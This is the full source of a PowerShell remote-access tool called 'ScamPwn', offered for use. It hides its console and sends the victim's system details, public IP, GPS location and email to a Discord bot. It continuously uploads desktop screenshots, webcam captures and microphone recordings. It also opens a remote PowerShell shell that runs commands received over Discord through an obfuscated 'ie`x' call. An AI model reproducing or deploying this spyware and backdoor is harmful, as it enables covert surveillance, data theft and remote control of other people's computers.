
<# ========================================= ScamPwn ===========================================

**SYNOPSIS**
Uses a Discord bot to send system information, a stream desktop and webcam screenshots
Also opens a powershell command line interface through discord.


**SETUP**
-SETUP THE BOT
1. make a discord bot at https://discord.com/developers/applications/
2. Enable all Privileged Gateway Intents on 'Bot' page
3. On OAuth2 page, tick 'Bot' in Scopes section
4. In Bot Permissions section tick Manage Channels, Read Messages/View Channels, Attach Files, Read Message History.
5. Copy the URL into a browser and add the bot to your server.
6. On 'Bot' page click 'Reset Token' and copy the token.

-SETUP THE SCRIPT
----- Option 1 ----- (token placed in ps1 file) [unsafe]
1. Copy the token into the script directly below.

----- Option 2 ----- (token hosted online) [slightly safer]
1. Create a file on Pastebin or Github with the content below - Supply your token and optional webhooks (include braces)
{
  "tk": "TOKEN_HERE",
  "scrwh": "WEBHOOK_HERE",
  "camwh": "WEBHOOK_HERE",
  "micwh": "WEBHOOK_HERE"
}
2. Copy the RAW file url eg. https://pastebin.com/raw/xxxxxxxx into this script below


**INFORMATION**
- The Discord bot you use must be in one server only
- You can specify webhooks to send duplicate files to other channels on another server (OPTIONAL)
-------------------------------------------------------------------------------------------------
#>

# ------------------------- OPTIONS + SETUP ---------------------------

# Option 1 -------- Set token directly here -------
$global:Token = 'TOKEN_HERE'
$global:ScreenshotWebhook = 'WEBHOOK1_HERE'
$global:WebcamWebhook = 'WEBHOOK2_HERE'
$global:MicrophoneWebhook = 'WEBHOOK3_HERE'

# Option 2 -------- Set json file URL ----------
$uri = "$uri"

# Option to start all jobs automatically upon running
$defaultstart = 1

# Option to hide the powershell console when running
$hideconsole = 1

# ----------------------------------------------------------------------

# ------------------------ CREATE FUNCTIONS ---------------------------

# Download ffmpeg.exe function (dependency for media capture) 
Function GetFfmpeg{
    sendMsg -Message ":hourglass: ``Downloading FFmpeg to Client.. Please Wait`` :hourglass:"
    $Path = "$env:Temp\ffmpeg.exe"
    $tempDir = "$env:temp"
    If (!(Test-Path $Path)){  
        $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
        $wc = New-Object System.Net.WebClient           
        $wc.Headers.Add("User-Agent", "PowerShell")
        $response = $wc.DownloadString("$apiUrl")
        $release = $response | ConvertFrom-Json
        $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
        $zipUrl = $asset.browser_download_url
        $zipFilePath = Join-Path $tempDir $asset.name
        $extractedDir = Join-Path $tempDir ($asset.name -replace '.zip$', '')
        $wc.DownloadFile($zipUrl, $zipFilePath)
        Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
        Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
        rm -Path $zipFilePath -Force
        rm -Path $extractedDir -Recurse -Force
    }
}

# Create a new category for text channels function
Function NewChannelCategory{
    $headers = @{
        'Authorization' = "Bot $token"
    }
    $guildID = $null
    while (!($guildID)){    
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", $headers.Authorization)    
        $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
        $guilds = $response | ConvertFrom-Json
        foreach ($guild in $guilds) {
            $guildID = $guild.id
        }
        sleep 3
    }
    $uri = "https://discord.com/api/guilds/$guildID/channels"
    $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
    $body = @{
        "name" = "$env:COMPUTERNAME"
        "type" = 4
    } | ConvertTo-Json    
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token")
    $wc.Headers.Add("Content-Type", "application/json")
    $response = $wc.UploadString($uri, "POST", $body)
    $responseObj = ConvertFrom-Json $response
    Write-Host "The ID of the new category is: $($responseObj.id)"
    $global:CategoryID = $responseObj.id
}

# Create a new channel function
Function NewChannel{
param([string]$name)
    $headers = @{
        'Authorization' = "Bot $token"
    }    
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)    
    $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
    $guilds = $response | ConvertFrom-Json
    foreach ($guild in $guilds) {
        $guildID = $guild.id
    }
    $uri = "https://discord.com/api/guilds/$guildID/channels"
    $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
    $body = @{
        "name" = "$name"
        "type" = 0
        "parent_id" = $CategoryID
    } | ConvertTo-Json    
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token")
    $wc.Headers.Add("Content-Type", "application/json")
    $response = $wc.UploadString($uri, "POST", $body)
    $responseObj = ConvertFrom-Json $response
    Write-Host "The ID of the new channel is: $($responseObj.id)"
    $global:ChannelID = $responseObj.id
}

# Send a message or embed to discord channel function
function sendMsg {
    param([string]$Message,[string]$Embed)

    $url = "https://discord.com/api/v9/channels/$SessionID/messages"
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token")

    if ($Embed) {
        $jsonBody = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
        $wc.Headers.Add("Content-Type", "application/json")
        $response = $wc.UploadString($url, "POST", $jsonBody)
        if ($webhook){
            $body = @{"username" = "Scam BOT" ;"content" = "$jsonBody"} | ConvertTo-Json
            IRM -Uri $webhook -Method Post -ContentType "application/json" -Body $jsonBody
        }
        $jsonPayload = $null
    }
    if ($Message) {
            $jsonBody = @{
                "content" = "$Message"
                "username" = "$env:computername"
            } | ConvertTo-Json
            $wc.Headers.Add("Content-Type", "application/json")
            $response = $wc.UploadString($url, "POST", $jsonBody)
            if ($webhook){
                IRM -Uri $webhook -Method Post -ContentType "application/json" -Body $jsonBody
            }
	        $message = $null
    }
}

# Gather System and user information
Function quickInfo{
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Device
    $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
    $GeoWatcher.Start()
    while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {Sleep -M 100}  
    if ($GeoWatcher.Permission -eq 'Denied'){$GPS = "Location Services Off"}
    else{
        $GL = $GeoWatcher.Position.Location | Select Latitude,Longitude;$GL = $GL -split " "
    	$Lat = $GL[0].Substring(11) -replace ".$";$Lon = $GL[1].Substring(10) -replace ".$"
        $GPS = "LAT = $Lat LONG = $Lon"
    }
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
        $adminperm = "False"
    } else {
        $adminperm = "True"
    }
    $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
    $userInfo = Get-WmiObject -Class Win32_UserAccount
    $processorInfo = Get-WmiObject -Class Win32_Processor
    $computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
    $userInfo = Get-WmiObject -Class Win32_UserAccount
    $videocardinfo = Get-WmiObject Win32_VideoController
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen;$Width = $Screen.Width;$Height = $Screen.Height;$screensize = "${width} x ${height}"
    $email = (Get-ComputerInfo).WindowsRegisteredOwner
    $OSString = "$($systemInfo.Caption)"
    $OSArch = "$($systemInfo.OSArchitecture)"
    $RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
    $processor = "$($processorInfo.Name)"
    $gpu = "$($videocardinfo.Name)"
    $ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
    $systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
    $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
    $script:jsonPayload = @{
        username   = $env:COMPUTERNAME
        tts        = $false
        embeds     = @(
            @{
                title       = "$env:COMPUTERNAME | Computer Information "
                "description" = @"
``````SYSTEM INFORMATION FOR $env:COMPUTERNAME``````
:man_detective: **User Information** :man_detective:
- **Current User**          : ``$env:USERNAME``
- **Email Address**         : ``$email``
- **Language**              : ``$systemLanguage``
- **Administrator Session** : ``$adminperm``

:minidisc: **OS Information** :minidisc:
- **Current OS**            : ``$OSString - $ver``
- **Architechture**         : ``$OSArch``

:globe_with_meridians: **Network Information** :globe_with_meridians:
- **Public IP Address**     : ``$computerPubIP``
- **Location Information**  : ``$GPS``

:desktop: **Hardware Information** :desktop:
- **Processor**             : ``$processor`` 
- **Memory**                : ``$RamInfo``
- **Gpu**                   : ``$gpu``
- **Screen Size**           : ``$screensize``

``````COMMAND LIST``````
- **Webcam**                : Send webcam screenshots to Discord
- **Screenshot**            : Send Desktop screenshots to Discord
- **Audio**                 : Record Microphone clips to Discord
- **PSconsole**             : Start Powershell Session in Discord
- **Pause**                 : Pause all running jobs
- **Close**                 : Close this session

"@
                color       = 65280
            }
        )
    }
    sendMsg -Embed $jsonPayload -webhook $webhook
}

# Hide powershell console window function
function HideWindow {
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
    if($hwnd -ne [System.IntPtr]::Zero){
        $Type::ShowWindowAsync($hwnd, 0)
    }
    else{
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }
}

# Scriptblock for PS console in discord
$doPowershell = {
param([string]$token,[string]$PowershellID)

    $url = "https://discord.com/api/v10/channels/$PowershellID/messages"
    $w = New-Object System.Net.WebClient
    $w.Headers.Add("Authorization", "Bot $token")
    function senddir{
        $dir = $PWD.Path
        $w.Headers.Add("Content-Type", "application/json")
        $j = @{"content" = "``PS | $dir >``"} | ConvertTo-Json
        $x = $w.UploadString($url, "POST", $j)
    }
    senddir
    while($true){
        $msg = $w.DownloadString($url)
        $r = ($msg | ConvertFrom-Json)[0]
        if(-not $r.author.bot){
            $a = $r.timestamp
            $msg = $r.content
        }
        if($a -ne $p){
            $p = $a
            $out = ie`x $msg
            $resultLines = $out -split "`n"
            $currentBatchSize = 0
            $batch = @()
            foreach ($line in $resultLines) {
                $lineSize = [System.Text.Encoding]::Unicode.GetByteCount($line)
                if (($currentBatchSize + $lineSize) -gt 1900) {
                    $w.Headers.Add("Content-Type", "application/json")
                    $j = @{"content" = "``````$($batch -join "`n")``````"} | ConvertTo-Json
                    $x = $w.UploadString($url, "POST", $j)
                    sleep 1
                    $currentBatchSize = 0
                    $batch = @()
                }
                $batch += $line
                $currentBatchSize += $lineSize
            }
            if ($batch.Count -gt 0) {
                $w.Headers.Add("Content-Type", "application/json")
                $j = @{"content" = "``````$($batch -join "`n")``````"} | ConvertTo-Json
                $x = $w.UploadString($url, "POST", $j)
            }
            senddir
        }
        sleep 3
    }
}

# Scriptblock for microphone input to discord
$audiojob = {
    param ([string]$token,[string]$MicrophoneID,[string]$MicrophoneWebhook)

    function sendFile {
        param([string]$sendfilePath)
        $url = "https://discord.com/api/v10/channels/$MicrophoneID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        if ($sendfilePath) {
            if (Test-Path $sendfilePath -PathType Leaf) {
                $response = $wc.UploadFile($url, "POST", $sendfilePath)
                if ($MicrophoneWebhook){
                    $hooksend = $wc.UploadFile($MicrophoneWebhook, "POST", $sendfilePath)
                }
            }
        }
    }
    $outputFile = "$env:Temp\Audio.mp3"
    Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system
    function getFriendlyName($id) {
        $reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id"
        return (get-ItemProperty $reg).FriendlyName
    }
    $id1 = [audio]::GetDefault(1)
    $MicName = "$(getFriendlyName $id1)"
    while($true){
        .$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t 60 -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $outputFile
        sendFile -sendfilePath $outputFile | Out-Null
        sleep 1
        rm -Path $outputFile -Force
    }
}

# Scriptblock for desktop screenshots to discord
$screenJob = {
    param ([string]$token,[string]$ScreenshotID,[string]$ScreenshotWebhook)

    function sendFile {
        param([string]$sendfilePath)
        $url = "https://discord.com/api/v10/channels/$ScreenshotID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        if ($sendfilePath) {
            if (Test-Path $sendfilePath -PathType Leaf) {
                $response = $wc.UploadFile($url, "POST", $sendfilePath)
                if ($ScreenshotWebhook){
                    $hooksend = $wc.UploadFile($ScreenshotWebhook, "POST", $sendfilePath)
                }
            }
        }
    }
    while($true){
        $mkvPath = "$env:Temp\Screen.jpg"
        .$env:Temp\ffmpeg.exe -f gdigrab -i desktop -frames:v 1 -vf "fps=1" $mkvPath
        sendFile -sendfilePath $mkvPath | Out-Null
        sleep 5
        rm -Path $mkvPath -Force
    }
}

# Scriptblock for webcam screenshots to discord
$camJob = {
    param ([string]$token,[string]$WebcamID,[string]$WebcamWebhook)
    
    function sendFile {
        param([string]$sendfilePath)
        $url = "https://discord.com/api/v10/channels/$WebcamID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        if ($sendfilePath) {
            if (Test-Path $sendfilePath -PathType Leaf) {
                $response = $wc.UploadFile($url, "POST", $sendfilePath)
                if ($WebcamWebhook){
                    $hooksend = $wc.UploadFile($WebcamWebhook, "POST", $sendfilePath)
                }
            }
        }
    }
    $imagePath = "$env:Temp\Image.jpg"
    $Input = (Get-CimInstance Win32_PnPEntity | ? {$_.PNPClass -eq 'Camera'} | select -First 1).Name
    if (!($input)){$Input = (Get-CimInstance Win32_PnPEntity | ? {$_.PNPClass -eq 'Image'} | select -First 1).Name}
    while($true){
        .$env:Temp\ffmpeg.exe -f dshow -i video="$Input" -frames:v 1 -y $imagePath
        sendFile -sendfilePath $imagePath | Out-Null
        sleep 5
        rm -Path $imagePath -Force
    }
}

# Delete all temp media files
function Cleanup {
    $campath = "$env:Temp\Image.jpg"
    $screenpath = "$env:Temp\Screen.jpg"
    $micpath = "$env:Temp\Audio.mp3"
    If (Test-Path $campath){  
        rm -Path $campath -Force
    }
    If (Test-Path $screenpath){  
        rm -Path $screenpath -Force
    }
    If (Test-Path $micpath){  
        rm -Path $micpath -Force
    }
}

# Function to start all jobs upon script execution
function StartAll{
    Start-Job -ScriptBlock $camJob -Name Webcam -ArgumentList $global:token, $global:WebcamID, $global:WebcamWebhook
    sendMsg -Message ":camera: ``$env:COMPUTERNAME Webcam Session Started!`` :camera:"
    sleep 1
    Start-Job -ScriptBlock $screenJob -Name Screen -ArgumentList $global:token, $global:ScreenshotID, $global:ScreenshotWebhook
    sendMsg -Message ":desktop: ``$env:COMPUTERNAME Screenshot Session Started!`` :desktop:"
    sleep 1
    Start-Job -ScriptBlock $audioJob -Name Audio -ArgumentList $global:token, $global:MicrophoneID, $global:MicrophoneWebhook
    sendMsg -Message ":microphone2: ``$env:COMPUTERNAME Microphone Session Started!`` :microphone2:"
    sleep 1
    Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID
    sendMsg -Message ":keyboard: ``$env:COMPUTERNAME PS Session Started!`` :keyboard:"
}

# ------------------------  FUNCTION CALLS + SETUP  ---------------------------

# Hide the console
If ($hideconsole -eq 1){ 
    HideWindow
}

# Get token and webhooks from online json file (if using option 2)
if ($token.length -ne 72){
    while ($token.length -ne 72){
        $keys = irm "$uri"
        $global:token = $keys.tk
        $global:ScreenshotWebhook = $keys.scrwh
        $global:WebcamWebhook = $keys.camwh
        $global:MicrophoneWebhook = $keys.micwh
        sleep 3
    }
}

# Create category and new channels
NewChannelCategory
sleep 1
NewChannel -name 'session-control'
$global:SessionID = $ChannelID
sleep 1
NewChannel -name 'screenshots'
$global:ScreenshotID = $ChannelID
sleep 1
NewChannel -name 'webcam'
$global:WebcamID = $ChannelID
sleep 1
NewChannel -name 'microphone'
$global:MicrophoneID = $ChannelID
sleep 1
NewChannel -name 'powershell'
$global:PowershellID = $ChannelID
sleep 1

# Gather system information and send to discord
quickInfo

# Download ffmpeg to temp folder
$Path = "$env:Temp\ffmpeg.exe"
If (!(Test-Path $Path)){  
    GetFfmpeg
}

# Start all functions upon running the script
If ($defaultstart -eq 1){ 
    StartAll
}

# Send setup complete message to discord
sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Setup Complete!`` :white_check_mark:"

# -----------------------  MAIN LOOP  ---------------------------

# Begin main loop checking for new messages
while ($true) {

    $headers = @{
        'Authorization' = "Bot $token"
    }
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)
    $messages = $wc.DownloadString("https://discord.com/api/v10/channels/$SessionID/messages")
    $most_recent_message = ($messages | ConvertFrom-Json)[0]
    if (-not $most_recent_message.author.bot) {
        $latestMessageId = $most_recent_message.timestamp
        $messages = $most_recent_message.content
    }
    if ($latestMessageId -ne $lastMessageId) {
        $lastMessageId = $latestMessageId
        $global:latestMessageContent = $messages
        $camrunning = Get-Job -Name Webcam
        $sceenrunning = Get-Job -Name Screen
        $audiorunning = Get-Job -Name Audio
        $PSrunning = Get-Job -Name PSconsole
        if ($messages -eq 'webcam'){
            if (!($camrunning)){
                Start-Job -ScriptBlock $camJob -Name Webcam -ArgumentList $global:token, $global:WebcamID, $global:WebcamWebhook
                sendMsg -Message ":camera: ``$env:COMPUTERNAME Webcam Session Started!`` :camera:"
            }
            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
        }
        if ($messages -eq 'screenshot'){
            if (!($sceenrunning)){
                Start-Job -ScriptBlock $screenJob -Name Screen -ArgumentList $global:token, $global:ScreenshotID, $global:ScreenshotWebhook
                sendMsg -Message ":desktop: ``$env:COMPUTERNAME Screenshot Session Started!`` :desktop:"
            }
            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
        }
        if ($messages -eq 'psconsole'){
            if (!($PSrunning)){
                Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID
                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME PS Session Started!`` :white_check_mark:"
            }
            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
        }
        if ($messages -eq 'audio'){
            if (!($audiorunning)){
                Start-Job -ScriptBlock $audioJob -Name Audio -ArgumentList $global:token, $global:MicrophoneID, $global:MicrophoneWebhook
                sendMsg -Message ":microphone2: ``$env:COMPUTERNAME Microphone Session Started!`` :microphone2:"
            }
            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
        }
        if ($messages -eq 'pause'){
            Stop-Job -Name Audio
            Stop-Job -Name Screen
            Stop-Job -Name Webcam
            Stop-Job -Name PSconsole
            Remove-Job -Name Audio
            Remove-Job -Name Screen
            Remove-Job -Name Webcam
            Remove-Job -Name PSconsole
            Cleanup
            sendMsg -Message ":no_entry: ``Stopped All Jobs! : $env:COMPUTERNAME`` :no_entry:"   
        }
        if ($messages -eq 'close'){
            sendMsg -Message ":no_entry: ``Closing Session : $env:COMPUTERNAME`` :no_entry:"
            Cleanup
            sleep 2
            exit      
        }
    }
    Sleep 3
}
